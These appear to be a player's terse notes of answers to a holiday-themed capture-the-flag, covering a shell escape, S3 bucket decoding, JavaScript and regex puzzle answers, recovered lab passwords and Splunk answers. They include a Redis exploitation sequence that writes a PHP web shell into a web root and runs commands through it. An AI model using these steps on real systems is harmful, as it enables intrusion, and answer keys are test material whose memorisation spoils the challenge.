Shell escape
	option 4 > name && /bin/bash
S3 Buckets
	use bucket_finder.rb wrapper3000 --download
	base64 --decode package >> test
	unzip test
	tar -xf package.txt.Z.xz.xxd.tar.bz2
	xxd -r package.txt.Z.xz.xxd >> package.txt.Z.xz
	unxz package.txt.Z.xz
	uncompress package.txt.Z
	cat package.txt
	North Pole: The Frostiest Place on Earth
Javascript Challenge:
	1 - elf.moveLeft(10);
elf.moveUp(12)
	2 - var answer = elf.get_lever(0) + 2
elf.moveLeft(6)
elf.pull_lever(answer)
elf.moveLeft(4)
elf.moveUp(12)
	3 - elf.moveTo(lollipop[0])
elf.moveTo(lollipop[1])
elf.moveTo(lollipop[2])
elf.moveUp(4)
	4 - for (var i = 0; i < 3; i++) {
elf.moveLeft(3);
elf.moveUp(40);
elf.moveLeft(2);
elf.moveDown(40);}
	5 - var test = elf.ask_munch(0);
var answer = test.filter(Number);
elf.moveTo(munchkin[0]);
elf.tell_munch(answer);
elf.moveUp(4);
	6 - var answer = elf.get_lever(0);
answer = answer.unshift("Munchkins Rule");
for (var i = 0; i < 4; i++) {
  elf.moveTo(lollipop[i]);
}
elf.moveTo(lever[0]);
elf.pull_lever(answer); #Lever still not working
elf.moveTo(munchkin[0]);
Redis RCE:
	curl http://localhost/maintenance.php?cmd=get+config+*  R3disp@ss
	redis-cli
	auth R3disp@ss
	config set dir /var/www/html
	config set dbfilename redis.php
	config set test <?php system(\$_GET['c']); ?>
	exit
	curl http://localhost/redis.php?c=more+index.php
	
Door, lights, vending machines, lights
	strings Door (pass:Op3nTheD00r)
	cd ~/lab
	copy encrypted pass to name field in lights.conf
	./lights (pass: Computer-TurnLightsOn)
	cd home and run ./lights
	cd ~/lab
	mv vending-machines.json vending-machines.json.old
	./vending-machines (creates new config)
	user: AAAA
	pass: abcdefghijklmnopqrstuvwxyz (pass encrypted as "9UedAffhM83WsX4LYNPCwn2Eia")
	pass: aaaaaa (encrypted as "9Vbtac"
	cat vending-machines.json
	encryption IS deterministic, length equal, username has no effect, clearly progressive
	to crack: LVEdQPpBwr 10-characters
		  
		  CandyCane1
Javascript Regex:
	1 - \d	digits only
	2 - [a-zA-Z]{3}		3x alphabetic case-insensitive
	3 - [a-z0-9]{2} 	2x alpha-numeric
	4 - [^A-L1-5]{2} 	2x anything not A-L 1-5
	5 - ^[0-9]{3,}$ 	3 or more numeric 
	6 - ^([0|1]?[0-9]|2[0-3]):([0-5][0-9]):([0-5][0-9])$   HH:MM:SS
	7 - ^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$	MAC Address
	8 - ^([0|1][0-9])[.\/-]([0|1|2][0-9]|3[0-1])[.\/-]([0-9]{4})$  Any MM/DD/YYYY format

HID Lock:
 	#db# TAG ID: 2006e22f0e (6023) - Format Len: 26 bit - FC: 113 - Card: 6023

Splunk:
	1 - 13
	2 - t1059.003-main t1059.003-win
	3 - HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
	4 - 2020-11-30T17:44:15Z
	5 - 3648
	6 - quser
	7 - 
	Objective - 


	
	

	
	